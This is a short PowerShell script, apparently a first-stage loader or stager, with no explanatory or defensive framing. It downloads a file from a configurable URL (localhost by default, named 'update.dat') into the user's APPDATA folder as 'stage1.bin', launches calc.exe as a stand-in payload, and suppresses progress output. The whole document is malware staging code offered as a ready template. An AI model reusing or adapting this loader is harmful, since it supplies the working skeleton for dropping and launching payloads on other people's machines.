[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://127.0.0.1/update.dat",
    [string]$PayloadPath = "$env:APPDATA\stage1.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $PayloadPath); Start-Process -FilePath "calc.exe"; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
